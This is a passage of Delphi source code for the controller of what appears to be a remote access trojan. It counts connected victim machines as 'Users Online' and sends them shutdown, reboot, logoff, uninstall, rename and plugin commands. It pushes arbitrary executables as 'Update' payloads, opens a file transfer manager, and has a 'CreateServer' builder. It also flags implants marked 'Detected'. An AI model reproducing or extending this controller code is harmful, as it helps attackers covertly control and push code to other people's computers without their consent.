  Ini: TIniFile;
begin
  try
    PointerList := TList.Create;

    SystrayIcon := TSystray.Create(nil);
    SystrayIcon.Hint := Caption;
    SystrayIcon.Icon := Icon;
    SystrayIcon.PopupMenu := PopupMenu3;
    SystrayIcon.OnDblClick := Systray1Click;
    SystrayIcon.Visible := True;

    ConnectionCount := 0;

    for i := 0 to Treeview1.items.count -1 do begin
      Treeview1.items[i].Expand(true);
    end;

    UpdatePlugins;

    //Ini := TIniFile.Create(ChangeFileExt(application.ExeName,'.ini'));

  finally
    //Ini.Free;
  end;
end;

procedure EnumMenu(Node: TMenuItem; Text: string);
var
  i: integer;
  temp: string;
begin
  for i := 0 to Node.Count -1 do begin;
    temp := ansireplacestr(Node.Items[i].Caption,'&','');
    if Temp = Text then begin
      Node.Items[i].Click;
      exit;
    end;
    if Node.Items[i].Count > 0 then EnumMenu(Node,Text);
  end;
end;

procedure TClient.TreeView1DblClick(Sender: TObject);
var
  i: integer;
  temp: string;
begin
  if not assigned(treeview1.selected) then exit;
  for i := 0 to popupmenu1.Items.Count -1 do begin
    temp := ansireplacestr(popupmenu1.Items[i].Caption,'&','');
    if Temp = treeview1.selected.Text then begin
      popupmenu1.Items[i].Click;
      exit;
    end;
    EnumMenu(popupmenu1.Items[i],treeview1.selected.Text);
  end;
end;


procedure TClient.Settings1Click(Sender: TObject);
begin
  Settings.showmodal;
end;

procedure TClient.Share1Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  if ShareServer.ShowModal = mrok then begin
    Socket.SendText('ShareServer|' + ShareServer.Edit1.Text + '|' + ShareServer.Edit2.Text);
  end;
end;

procedure TClient.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  SocketClose: procedure(Socket: TCustomWinSocket);
begin
  if Socket.Data = nil then exit;
  if TSocketData(Socket.Data).MainListItem <> nil then TSocketData(Socket.Data).MainListItem.Delete;
  @SocketClose := TSocketData(Socket.Data).OnSocketClose;
  if @SocketClose <> nil then SocketClose(Socket);
end;

procedure TClient.ServerSocket1ClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
var
  SocketClose: procedure(Socket: TCustomWinSocket);
begin
  {if ErrorEvent = eeGeneral	then showmessage('eeGeneral');
  if ErrorEvent = eeSend		then showmessage('eeSend	');
  if ErrorEvent = eeReceive		then showmessage('eeReceive	');
  if ErrorEvent = eeConnect		then showmessage('eeConnect	');
  if ErrorEvent = eeDisconnect		then showmessage('eeDisconnect	');
  if ErrorEvent = eeAccept		then showmessage('eeAccept	'); }

  if TSocketData(Socket.Data).MainListItem <> nil then TSocketData(Socket.Data).MainListItem.Delete;
  @SocketClose := TSocketData(Socket.Data).OnSocketClose;
  if @SocketClose <> nil then SocketClose(Socket);
end;

function AllHaveSameIcon(ListView: TSortListView): bool;
var
  i,x,imageindex: integer;
begin
  result := false;
  for i := Listview.Items.Count -1 downto 0 do begin
    imageindex := Listview.items[i].ImageIndex;
    for x := Listview.Items.Count -1 downto 0 do begin
      if Listview.Items[x].ImageIndex <> ImageIndex then exit;
    end;
  end;
  result := true;
end;

procedure TClient.Timer1Timer(Sender: TObject);
var
  i: integer;
  Count: integer;
begin
  Count := 0;
  for i := 0 to PointerList.Count -1 do begin

    if TTabData(PointerList.Items[i]).Listview.Items.Count > 0 then begin

      if AllHaveSameIcon(TTabData(PointerList.Items[i]).Listview) then begin
        TTabData(PointerList.Items[i]).TabSheet.ImageIndex := TTabData(PointerList.Items[i]).Listview.Items[0].ImageIndex;
      end else begin
        TTabData(PointerList.Items[i]).TabSheet.ImageIndex := -1;
      end;

      inc(Count,TTabData(PointerList.Items[i]).Listview.Items.Count);
    end else begin

      TTabData(PointerList.Items[i]).Listview.Free;
      TTabData(PointerList.Items[i]).TabSheet.Free;
      PointerList.Delete(i);
      if PointerList.Count = 0 then begin
        Treeview1.Hide;
        Splitter1.Hide;
      end;
      exit;

    end;
  end;

  PageControl1.Visible := (PointerList.Count > 0);
  Statusbar1.Panels[1].Text := inttostr(Count) + ' Users Online';
end;


procedure TClient.ListView1Deletion(Sender: TObject; Item: TListItem);
begin
  if item = LastItem then begin
    LastItem := nil;
    Statusbar1.Panels[0].Text := '';
  end;

end;

procedure TClient.Shutdown1Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SendData(Socket,'RunPlugin|SystemPower|Shutdown');
end;

procedure TClient.Reboot1Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SendData(Socket,'RunPlugin|SystemPower|Reboot');
end;
procedure TClient.LogOff1Click(Sender: TObject);
var
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SendData(Socket,'RunPlugin|SystemPower|Logoff');
end;

procedure TClient.Icon1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to pointerlist.Count -1 do begin
    ttabdata(pointerlist.Items[i]).Listview.ViewStyle := vsIcon;
  end;
  Icon1.Checked := True;
  SmallIcon1.Checked := False;
  Report1.Checked := False;
  List1.Checked := False;
end;

procedure TClient.SmallIcon1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to pointerlist.Count -1 do begin
    ttabdata(pointerlist.Items[i]).Listview.ViewStyle := vsSmallIcon;
  end;
  Icon1.Checked := False;
  SmallIcon1.Checked := True;
  Report1.Checked := False;
  List1.Checked := False;
end;
procedure TClient.Report1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to pointerlist.Count -1 do begin
    ttabdata(pointerlist.Items[i]).Listview.ViewStyle := vsReport;
  end;
  Icon1.Checked := False;
  SmallIcon1.Checked := False;
  Report1.Checked := True;
  List1.Checked := False;
end;
procedure TClient.List1Click(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to pointerlist.Count -1 do begin
    ttabdata(pointerlist.Items[i]).Listview.ViewStyle := vsList;
  end;
  Icon1.Checked := False;
  SmallIcon1.Checked := False;
  Report1.Checked := False;
  List1.Checked := True;
end;

procedure TClient.ransferManager1Click(Sender: TObject);
var
  SocketData: TSocketData;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);

  SocketData := TSocketData(Socket.Data);

  if SocketData.Form = nil then begin
    SocketData.Form := TTransferManager.Create(application);
    TTransferManager(SocketData.Form).MainSocket := Socket;
    TTransferManager(SocketData.Form).MainItem := LastItem;
    TTransferManager(SocketData.Form).Caption := 'TransferManager - ' + LastItem.Caption;
    Socket.SendText('NewConnection');
  end else begin
    SocketData.Form.Show;
  end;

end;

procedure TClient.ToolButton3Click(Sender: TObject);
begin
  CreateServer.ShowModal;
end;

procedure TClient.Close1Click(Sender: TObject);
var
  SocketData: TSocketData;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SendData(Socket,'Close');
end;

procedure TClient.Uninstall1Click(Sender: TObject);
var
  SocketData: TSocketData;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SendData(Socket,'Uninstall');
end;

procedure TClient.EditIdentification1Click(Sender: TObject);
var
  SocketData: TSocketData;
  Socket: TCustomWinSocket;
  Ini: TIniFile;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SocketData := TSocketData(Socket.Data);

  EditIdentification.Edit1.Text := SocketData.OriginalGroup;
  EditIdentification.Edit2.Text := SocketData.OriginalName;

  if EditIdentification.ShowModal <> mrok then exit;

  try
    MakeSureDirectoryPathExists(pchar(Settings.Edit1.Text + 'Users\' + LastItem.SubItems[0] + '\'));
    Ini := TIniFile.Create(Settings.Edit1.Text + 'Users\' + LastItem.SubItems[0] + '\Profile.ini');
    Ini.WriteString('Profile','UserName',EditIdentification.Edit1.Text + '|' + EditIdentification.Edit2.Text);
  finally
    Ini.Free;
  end;
  
  SendData(Socket,'ChangeName|' + EditIdentification.Edit1.Text + '|' + EditIdentification.Edit2.Text);

end;



procedure TClient.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Timer1.Enabled := False;
  PointerList.Free;
  SystrayIcon.Visible := False;
  ExitProcess(0);
end;

procedure TClient.Update1Click(Sender: TObject);
var
  Data: string;
  Stream: TMemoryStream;
  Socket: TCustomWinSocket;
begin
  if not opendialog1.Execute then exit;
  try
    Socket := TCustomWinSocket(LastItem.Data);
    TSocketData(Socket.Data).Updating := True;
    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(Opendialog1.FileName);
    SetLength(Data,Stream.size);
    Stream.Read(pointer(Data)^,Stream.Size);
    Data := 'Update|' + Data;
    SendData(Socket,Data);
  finally
    Stream.Free;
  end;
end;

procedure TClient.Systray1Click(Sender: TObject);
begin
  Application.Restore;
  Show;
  SetForegroundWindow(Handle);
end;


procedure TClient.Exit1Click(Sender: TObject);
begin
  Close;
end;

procedure TClient.Show1Click(Sender: TObject);
begin
  Application.Restore;
  Show;
  SetForegroundWindow(Handle);
end;

procedure TClient.Timer2Timer(Sender: TObject);
var
  x,i: integer;
  Listview: TSortListView;
  Socket: TCustomWinSocket;
begin
  for i := PointerList.Count -1 downto 0 do begin
    Listview := TTabData(PointerList.Items[i]).Listview;
    for x := Listview.Items.Count -1 downto 0 do begin

      try
        Socket := TCustomWinSocket(Listview.Items[x].Data);
        if TSocketData(Socket.Data).Updating then continue;
        TSocketData(Socket.Data).PingSent := GetTickCount;
        if TSocketData(Socket.Data).PingRecieved = False then begin   //server not yet replied
          if Listview.Items[x].SubItems[4] = '' then begin
            Listview.Items[x].SubItems[4] := inttostr(Timer2.Interval);
          end else begin
            Listview.Items[x].SubItems[4] := inttostr(strtoint(Listview.Items[x].SubItems[4]) + Timer2.Interval);
          end;
        end;
        TSocketData(Socket.Data).PingRecieved := False;
        Socket.SendText('Ping');
        
      except

        try

          if assigned(Listview.Items[x]) then begin
             if Listview.Items[x].SubItems[4] = '' then begin
              Listview.Items[x].SubItems[4] := inttostr(Timer2.Interval);
            end else begin
              Listview.Items[x].SubItems[4] := inttostr(strtoint(Listview.Items[x].SubItems[4]) + Timer2.Interval);
            end;
          end;

        except
        end;

      end;


    end;
  end;
end;

procedure TClient.ApplicationEvents1Minimize(Sender: TObject);
begin
  if settings.CheckBox4.Checked then begin
    Hide;
    ShowWindow(Application.Handle, SW_HIDE);
  end;
end;

procedure TClient.ListView1CustomSort(Sender: TObject;
  ColIndex: Integer; Str1, Str2: String; var Res: Integer;
  var Handled: Boolean);
var
  n1, n2: Integer;
begin
  if (ColIndex = 5) or (ColIndex = 4) then begin

    n1 := StrToIntDef(Str1, 0);
    n2 := StrToIntDef(Str2, 0);
    if (n1 = n2) then Res := 0
    else if (n1 > n2) then Res := 1
    else Res := -1;
    Handled := True;

  end;
end;

procedure TClient.Profile1Click(Sender: TObject);
var
  SocketData: TSocketData;
  Socket: TCustomWinSocket;
  //Profile: TProfile;
  Ini: TIniFile;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);

  Profile.MainItem := LastItem;
  Profile.Caption := 'Profile - '  + LastItem.Caption;

  try
    Ini := TIniFile.Create(Settings.Edit1.Text + 'Users\' + Lastitem.SubItems[0] + '\Profile.ini');
    try
      Profile.OpenPictureDialog1.FileName := Ini.ReadString('Profile','Image','');
      Profile.Image1.Picture.LoadFromFile(Ini.ReadString('Profile','Image',''));
    except
    end;
  finally
    Ini.Free;
  end;

  try
    Profile.Memo1.Clear;
    Profile.Memo1.Lines.LoadFromFile(Settings.Edit1.Text + 'Users\' + Lastitem.SubItems[0] + '\Profile.txt');
  finally
    Profile.ShowModal;
  end;




end;


function DownloadFile(URL:String; LocalFilename: String): Boolean;
begin
  URLDownloadToFile(nil,pchar(URL),pchar(LocalFilename), 0, nil);
end;

procedure TClient.CheckForUpdates1Click(Sender: TObject);
begin
  try
    Memo1.Text := '';
    DownloadFile('http://h1.ripway.com/biorante/Update2.txt','Update.txt');
    Memo1.Lines.LoadFromFile('Update.txt');
    DeleteFile('Update.txt');
    showmessage('Current Version: 4.0.4' + #13#10 + 'Latest Version: ' + Memo1.Lines[0]);
  except
    ShowMessage('Error');
  end;
end;

procedure TClient.SidePanel1Click(Sender: TObject);
begin
  SidePanel1.Checked := not SidePanel1.Checked;
  splitter1.Visible := SidePanel1.Checked;
  treeview1.Visible := SidePanel1.Checked;
end;

procedure TClient.ToolButton4Click(Sender: TObject);
begin
  about.showmodal;
end;

procedure TClient.ClientToClientChat1Click(Sender: TObject);
var
  ClientToClient: TClientToClient;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  ClientToClient := TClientToClient.Create(application);
  TSocketData(Socket.Data).Form := ClientToClient;
  ClientToClient.MainSocket := Socket;
  ClientToClient.Caption := 'ClientToClient - ' + LastItem.Caption;
  ClientToClient.Show;
end;

procedure TClient.UserFolder1Click(Sender: TObject);
var
  path: string;
begin
  path := Settings.Edit1.text + 'Users\' + LastItem.SubItems[0] + '\Downloads\';
  MakeSureDirectoryPathExists(pchar(path));
  ShellExecute(0,'open',pchar(path),'','',SW_SHOWNORMAL);
end;


function FileListRecursive(var FileListing: string; path: string; filter: string; recurse: bool): string;
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin

  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + filter), FindData);

  if hFind <> INVALID_HANDLE_VALUE then begin
    if FindData.dwFileAttributes and $00000010 = 0 then begin
      FileListing := FileListing + path + FindData.cFileName + '|';
    end else begin
      if (FindData.cFileName <> string('.')) and (FindData.cFileName <> string('..')) then if recurse then FileListRecursive(FileListing,path + FindData.cFileName,filter,recurse);
    end;
  end;

  while FindNextFile(hFind, FindData) = True do begin
    if FindData.dwFileAttributes and $00000010 = 0 then begin
      FileListing := FileListing + path + FindData.cFileName + '|';
    end else begin
      if (FindData.cFileName <> string('.')) and (FindData.cFileName <> string('..')) then if recurse then FileListRecursive(FileListing,path + FindData.cFileName,filter,recurse);
    end;
  end;

  Windows.FindClose(hFind);
end;

procedure TClient.UpdatePlugins;
var
  Text,Plugin,Files: string;
  Item: TMenuItem;
begin
  PluginMenu.Items.Clear;

  item := tmenuitem.Create(PluginMenu);
  item.Caption := 'Refresh';
  item.OnClick := MenuItemClick;
  item.ImageIndex := -1;
  PluginMenu.Items.Add(Item);

  item := tmenuitem.Create(PluginMenu);
  item.Caption := '-';
  item.OnClick := MenuItemClick;
  item.ImageIndex := -1;
  PluginMenu.Items.Add(Item);

  FileListRecursive(Files,extractfilepath(application.ExeName) + 'Plugins','*.dll',False);
  while Length(Files) > 0 do begin
    Plugin := split(Files,'|',1);
    Delete(Files,1,length(Plugin)+1);

    item := tmenuitem.Create(PluginMenu);
    item.ImageIndex := 5;
    Text := split(Plugin,'.',1);
    Text := extractfilename(text);
    item.Caption := Text;
    item.OnClick := MenuItemClick;
    PluginMenu.Items.Add(Item);

  end;

end;

procedure TClient.MenuItemClick(Sender: TObject);
var
  Item : TMenuItem;
  ButtonText: string;
  socket: tcustomwinsocket;
  SocketData: TSocketData;
begin
  if not assigned(LastItem) then exit;

  Socket := TCustomWinSocket(LastItem.Data);

  Item := TMenuItem(Sender);
  ButtonText := ansireplacestr(Item.Caption,'&','');

  if ButtonText = 'Refresh' then begin
    UpdatePlugins;
    exit;
  end;

  if ButtonText = '-' then exit;

  SendData(Socket,'NewConnection|' + ButtonText + '|' + LastItem.Caption);



end;


procedure TClient.Refresh1Click(Sender: TObject);
begin
  UpdatePlugins;
end;

 
procedure TClient.ListView1AdvancedCustomDrawItem(Sender: TCustomListView;
  Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
  var DefaultDraw: Boolean);
begin
  {if Odd(Item.Index) then begin
    TCustomListView(Sender).Canvas.Brush.Color := clSkyblue;
  end else begin
    TCustomListView(Sender).Canvas.Brush.Color := clWhite;
  end;}
  if TSocketData(TCustomwinsocket(Item.Data).Data).Updating then begin
    TListview(Sender).Canvas.Font.Color := clGreen;
  end else begin
    TListview(Sender).Canvas.Font.Color := clBlack;
  end;
end;

procedure TClient.ListView1AdvancedCustomDraw(Sender: TCustomListView;
  const ARect: TRect; Stage: TCustomDrawStage; var DefaultDraw: Boolean);
begin
    //TCustomListView(Sender).Canvas.Brush.Color := clred;
    //TCustomListView(Sender).Canvas.FillRect(ARect.BoundsRect);
    //application.ProcessMessages;
end;

procedure TClient.ListView1AdvancedCustomDrawSubItem(
  Sender: TCustomListView; Item: TListItem; SubItem: Integer;
  State: TCustomDrawState; Stage: TCustomDrawStage;
  var DefaultDraw: Boolean);
begin
  if Item.SubItems[4] <> '' then begin
    if strtoint(Item.SubItems[4]) >= 60000 then Item.Delete;  //1 min
    // shouldnt take longer to update than that as using main socket
  end;

  if TSocketData(TCustomwinsocket(Item.Data).Data).Updating then begin

    TListview(Sender).Canvas.Font.Color := clGreen;

  end else begin

    if (SubItem = 3) and (Item.SubItems[2] = 'Detected') then begin
      TListview(Sender).Canvas.Font.Color := clRed;
    end else begin
      TListview(Sender).Canvas.Font.Color := clBlack;
    end;

  end;

end;

end.
